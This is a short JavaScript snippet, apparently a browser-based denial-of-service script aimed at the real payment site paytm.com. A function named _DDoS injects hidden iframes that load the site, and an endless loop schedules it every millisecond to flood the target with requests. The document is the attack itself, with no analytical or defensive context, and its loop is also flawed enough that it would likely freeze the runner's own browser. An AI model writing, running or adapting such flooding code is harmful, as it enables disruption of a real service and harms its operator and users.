var url = ("paytm.com")

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout('_DDoS("https://paytm.com/")',1);
}
